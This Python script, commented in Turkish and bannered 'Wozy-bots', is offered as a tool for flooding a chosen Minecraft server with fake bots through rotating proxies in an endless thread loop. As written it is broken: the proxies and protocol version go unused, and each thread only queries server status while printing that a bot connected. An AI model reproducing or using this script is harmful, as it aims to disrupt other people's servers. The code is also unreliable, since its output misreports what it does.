import threading
import time
import random
import requests
from mcstatus import MinecraftServer
from faker import Faker

# Wozy-bots yazısı
print("*******************")
print("*    Wozy-bots    *")
print("*******************")

# Kullanıcı girişi
server_address = input("Sunucu IP ve Port (örnek: aternos.me:25565): ")
version_choice = int(input("Minecraft versiyonu seçin:\n1. 1.17.1\n2. 1.16.5\n3. 1.15.2\nSeçiminiz: "))
method_choice = input("Saldırı methodu seçin (örnek: botjoiner): ")
attack_delay = int(input("Saldırı aralığı (saniye): "))
thread_delay = float(input("Thread aralığı (saniye): "))

# Versiyon seçimine göre Minecraft protokol versiyonlarını ayarlayın
protocol_versions = {
    1: 756,  # 1.17.1
    2: 754,  # 1.16.5
    3: 578   # 1.15.2
}

# Seçilen versiyonun protokol versiyonunu alın
protocol_version = protocol_versions.get(version_choice)

# proxies.txt dosyasından proxy listesini okuyun
proxies = []
with open('proxies.txt', 'r') as file:
    proxies = file.read().strip().splitlines()

# Faker kütüphanesi ile rastgele veri oluşturun
fake = Faker()

def bot_attack(server_address, protocol_version):
    try:
        # Rastgele bir proxy seçin
        proxy = random.choice(proxies)

        # Rastgele bir Minecraft ismi oluşturun
        bot_name = fake.user_name()

        # Proxy ayarları ile HTTP isteği yapın
        session = requests.Session()
        session.proxies = {'http': proxy, 'https': proxy}

        server = MinecraftServer.lookup(server_address)
        status = server.status()
        print(f"Bot {bot_name} connected to server using proxy {proxy}. {status.players.online}/{status.players.max} players online.")
    except Exception as e:
        print(f"Failed to connect bot: {e}")

# Bot saldırısını başlat
threads = []
while True:
    thread = threading.Thread(target=bot_attack, args=(server_address, protocol_version))
    threads.append(thread)
    thread.start()
    time.sleep(attack_delay)

    # Thread aralığı
    time.sleep(thread_delay)

# Tüm thread'lerin bitmesini bekleyin
for thread in threads:
    thread.join()
